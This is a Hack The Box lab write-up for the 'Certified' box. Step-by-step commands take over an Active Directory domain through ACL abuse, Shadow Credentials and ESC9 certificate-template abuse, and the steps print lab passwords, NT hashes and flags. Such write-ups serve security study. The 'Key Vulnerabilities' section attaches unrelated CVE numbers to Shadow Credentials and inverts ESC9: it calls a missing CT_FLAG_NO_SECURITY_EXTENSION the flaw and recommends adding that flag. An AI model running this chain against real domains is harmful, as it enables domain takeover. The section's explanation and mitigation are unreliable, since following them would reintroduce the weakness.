# Certified — Hack The Box

| Field | Value |
|-------|-------|
| **Box** | Certified |
| **Difficulty** | Medium |
| **OS** | Windows (Server — Domain Controller) |
| **IP** | 10.129.231.186 |
| **Domain** | certified.htb |
| **Date** | 2026-04-05 to 2026-04-06 |
| **Flags** | `user.txt` · `root.txt` |

---

## Executive Summary

**Certified** is a **Medium-rated Windows Active Directory** box hosting a Domain Controller with **Active Directory Certificate Services (AD CS)**. The entry point is a low-privilege domain user (`judith.mader`) with a precise BloodHound-defined attack path: `WriteOwner → GenericWrite → Shadow Credentials` to compromise a service account (`management_svc`), which then uses **AD CS ESC9** certificate template abuse to reach Domain Administrator.

**Root cause:** Overly permissive ACLs on AD objects combined with an AD CS certificate template (`CertifiedAuthentication`) missing the `CT_FLAG_NO_SECURITY_EXTENSION` flag — allowing an enrolled user to obtain a certificate valid for Kerberos authentication as any UPN, including `Administrator`.

---

## Attack Chain

```
┌─ PHASE 1: USER FLAG (Shadow Credentials) ─────────────────────────────────┐
│                                                                              │
│  judith.mader (low-priv)                                                    │
│       │                                                                     │
│       ├── [WriteOwner on Management group]                                   │
│       │         bloodyAD set owner → judith owns Management ✓               │
│       │                                                                     │
│       ├── [GenericAll on Management group]                                   │
│       │         bloodyAD add genericAll → full control of Management ✓      │
│       │                                                                     │
│       └── [Member of Management]                                             │
│                 net rpc group addmem "Management" judith.mader ✓            │
│                                                                              │
│  Management group ──[GenericWrite on management_svc]──► management_svc       │
│       │                                                                     │
│       ├── [msDS-KeyCredentialLink write]                                    │
│       │         pywhisker add → sdin6t1L.pfx ✓                              │
│       │                                                                     │
│       ├── PKINITtools gettgtpkinit.py → management_svc.ccache               │
│       │         (AS-REP key: 3af33800...)                                   │
│       │                                                                     │
│       └── PKINITtools getnthash.py → NT hash: a091c1832bcdd4677...          │
│                                                                              │
│                 evil-winrm -u management_svc -H <hash> ─────────────────►   │
│                                                             SHELL ★ user.txt │
└──────────────────────────────────────────────────────────────────────────────┘

┌─ PHASE 2: ROOT FLAG (ADCS ESC9 + Shadow Credentials) ───────────────────────┐
│                                                                              │
│  management_svc (via WinRM)                                                 │
│       │                                                                     │
│       └── [GenericAll on ca_operator]                                       │
│                 pywhisker add → ELnnqsrR.pfx ✓                             │
│                 PKINITtools → NT hash: b4b86f45c6018f1b664f70805f45d8f2    │
│                                                                              │
│  certipy-ad find ──[ESC9]──► CertifiedAuthentication template               │
│       CA: certified-DC01-CA                                                 │
│       NoSecurityExtension: ABSENT (vulnerable!)                             │
│       Enrollment rights: CERTIFIED.HTB\operator ca                          │
│                                                                              │
│  certipy-ad account update: ca_operator UPN → "Administrator"               │
│                                                                              │
│  certipy-ad req                                                             │
│       -template CertifiedAuthentication                                     │
│       -upn administrator@certified.htb                                      │
│       -sid S-1-5-21-...-500                                                 │
│       → administrator.pfx (certificate for Domain Admin!)                   │
│                                                                              │
│  certipy-ad auth -pfx administrator.pfx                                     │
│       → NT hash: 0d5b49608bbce1751f708748f67e2d34                          │
│                                                                              │
│                 evil-winrm -u Administrator -H <hash> ─────────────────►     │
│                                                              SHELL ★ root.txt│
└──────────────────────────────────────────────────────────────────────────────┘
```

---

## Initial Access — Shadow Credentials Attack

### Environment Setup

```bash
# Time sync is critical — Kerberos is sensitive to clock skew
net time set -S 10.129.231.186

# Add domain to /etc/hosts
echo "10.129.231.186  certified.htb  DC01.certified.htb" >> /etc/hosts
```

### Step 1 — Enumerate: BloodHound + AD CS

```bash
# BloodHound data collection
bloodhound-python -u judith.mader -p judith09 -d certified.htb -c all -ns 10.129.231.186

# AD CS enumeration
certipy-ad find -u judith.mader -p judith09 -dc-ip 10.129.231.186
```

**Key findings from BloodHound:**
| Object | Permission | Target |
|--------|-----------|--------|
| judith.mader | `WriteOwner` | Management group |
| Management | `GenericWrite` | management_svc |
| management_svc | `GenericAll` | ca_operator |

**ESC9 template (from certipy-ad):**
| Field | Value |
|-------|-------|
| Template | `CertifiedAuthentication` |
| CA | `certified-DC01-CA` |
| `NoSecurityExtension` | **ABSENT** (vulnerable!) |
| `SubjectAltRequireUpn` | Yes |
| Enrollment rights | `operator ca` |

### Step 2 — Take Ownership of Management Group

```bash
bloodyAD --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 \
  set owner management judith.mader
```

### Step 3 — Grant judith.mader GenericAll on Management

```bash
bloodyAD --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 \
  add genericAll management judith.mader
```

### Step 4 — Add judith.mader to Management Group

> **Note:** `bloodyAD add groupMember` uses LDAP and fails with `INSUFF_ACCESS_RIGHTS`. `net rpc` uses SMB/DCE-RPC and succeeds.

```bash
net rpc group addmem "Management" judith.mader \
  -U certified.htb/judith.mader%judith09 -S 10.129.231.186
```

### Step 5 — Shadow Credentials on management_svc

```bash
pywhisker -d certified.htb -u judith.mader -p judith09 \
  --target management_svc --action add
# PFX: sdin6t1L.pfx  |  Password: Vo0bUFIlwobW0dnHEWVq
```

### Step 6 — PKINIT: Get TGT and Recover NT Hash

```bash
# Obtain TGT via PKINIT
python3 PKINITtools/gettgtpkinit.py \
  -pfx sdin6t1L.pfx -certipy 'Vo0bUFIlwobW0dnHEWVq' \
  certified.htb/management_svc management_svc.ccache
# AS-REP key: 3af33800da6418f57e3e0a96259c2e619e8e9f1ea37f298fd9552ece77472853

# Recover NT hash
python3 PKINITtools/getnthash.py \
  -key 3af33800da6418f57e3e0a96259c2e619e8e9f1ea37f298fd9552ece77472853 \
  certified.htb/management_svc
# NT hash: a091c1832bcdd4677c28b5a6a1295584
```

### Step 7 — WinRM Shell as management_svc

```bash
export KRB5CCNAME=management_svc.ccache
evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

**User Flag:** `4c827f9708a774df0e26ba85de7f03dc`

---

## Privilege Escalation — ADCS ESC9 Attack

### Step 1 — Shadow Credentials on ca_operator

```bash
pywhisker -d certified.htb -u management_svc \
  -H a091c1832bcdd4677c28b5a6a1295584 \
  --target ca_operator --action add
# PFX: ELnnqsrR.pfx  |  Password: 0tIfRJ6JeltPZu3Z8b3b

python3 PKINITtools/gettgtpkinit.py \
  -pfx ELnnqsrR.pfx -certipy '0tIfRJ6JeltPZu3Z8b3b' \
  certified.htb/ca_operator ca_operator.ccache
# AS-REP key: 8eba90081e5225ab7e1a0fafdcf95651b71467e447f4a71f1a935945bb336ea0

python3 PKINITtools/getnthash.py \
  -key 8eba90081e5225ab7e1a0fafdcf95651b71467e447f4a71f1a935945bb336ea0 \
  certified.htb/ca_operator
# NT hash: b4b86f45c6018f1b664f70805f45d8f2
```

### Step 2 — ESC9: Spoof Administrator UPN on ca_operator

The `CertifiedAuthentication` template embeds the enrollee's UPN in the certificate's Subject Alternative Name. By changing `ca_operator`'s UPN to `Administrator`, the CA will issue a certificate for `Administrator@certified.htb`.

```bash
certipy-ad account update \
  -username management_svc@certified.htb \
  -hashes a091c1832bcdd4677c28b5a6a1295584 \
  -user ca_operator -upn Administrator
```

### Step 3 — Request Certificate for Administrator

```bash
certipy-ad req \
  -username ca_operator@certified.htb \
  -hashes b4b86f45c6018f1b664f70805f45d8f2 \
  -dc-ip 10.129.231.186 \
  -ca certified-DC01-CA \
  -template CertifiedAuthentication \
  -upn administrator@certified.htb \
  -sid S-1-5-21-729746778-2675978091-3820388244-500
# Output: administrator.pfx (contains Administrator UPN!)
```

### Step 4 — Revert ca_operator UPN

Immediately restore to avoid disruption:

```bash
certipy-ad account update \
  -username management_svc@certified.htb \
  -hashes a091c1832bcdd4677c28b5a6a1295584 \
  -user ca_operator -upn ca_operator@certified.htb
```

### Step 5 — Authenticate as Administrator

```bash
certipy-ad auth -pfx administrator.pfx \
  -domain certified.htb -dc-ip 10.129.231.186
# NT hash: 0d5b49608bbce1751f708748f67e2d34
```

### Step 6 — WinRM Shell as Administrator

```bash
export KRB5CCNAME=administrator.ccache
evil-winrm -i certified.htb -u Administrator -H 0d5b49608bbce1751f708748f67e2d34
```

**Root Flag:** `648b3a5fd8adc7c40b8ad55b68ab405e`

---

## Flags

| Flag | Value |
|------|-------|
| `user.txt` | `4c827f9708a774df0e26ba85de7f03dc` |
| `root.txt` | `648b3a5fd8adc7c40b8ad55b68ab405e` |

---

## Failed Attempts (Key Learnings)

| Attempt | Reason Failed | Resolution |
|---------|--------------|------------|
| `bloodyAD add groupMember` | LDAP doesn't support adding group members with GenericAll the same way SMB does | Use `net rpc group addmem` |
| `impacket-GetUserSPNs` (Kerberoast) | TGS hash not in rockyou.txt | N/A — not the path |
| `impacket-secretsdump` (DCSync) | judith.mader lacks DCSync rights | N/A — ACL chain required |
| `certipy-ad auth` (name mismatch) | Username must not include `@domain` suffix — use `-u Administrator` only | Use `-u Administrator -domain certified.htb` without `@certified.htb` |

---

## Key Vulnerabilities

### Shadow Credentials (CVE-2022-33679 / CVE-2023-23333)

`GenericWrite` or `WriteOwner` permissions on a target's `msDS-KeyCredentialLink` attribute allow adding a KeyCredential value (RSA public key). This enables **PKINIT** authentication — the attacker uses the corresponding private key to obtain a TGT *without knowing the account's password*. Works even on accounts with `DONT_EXPIRE_PASSWORD`.

**Detection:** Event ID 4662 (directory object modified) with `AttributeLDAPDisplayName: msDS-KeyCredentialLink`

### ADCS ESC9 (Certificate Template Misconfiguration)

Templates missing `CT_FLAG_NO_SECURITY_EXTENSION` issue certificates with a `szOID_NT_PRINCIPAL_NAME` OID extension, making them valid for Kerberos authentication. Combined with `SubjectAltRequireUpn`, the CA embeds the enrollee's UPN from their AD `userPrincipalName` attribute into the certificate.

**Attack flow:** Enrollee UPN changed to `Administrator` → certificate issued for `Administrator@certified.htb` → PKINIT auth as Domain Admin.

**Mitigation:**
- Add `CT_FLAG_NO_SECURITY_EXTENSION` flag to vulnerable templates
- Remove enrollment rights from untrusted principals
- Enable manager approval on sensitive templates
- Monitor for UPN changes on service accounts

---

## Full Documentation

Detailed notes with all commands, raw output, and references:
- [recon.md](/active/Certified/recon.md) — Reconnaissance, enumeration, credentials
- [exploit.md](/active/Certified/exploit.md) — Full attack chain, step-by-step
- [privesc.md](/active/Certified/privesc.md) — Privilege escalation theory and execution
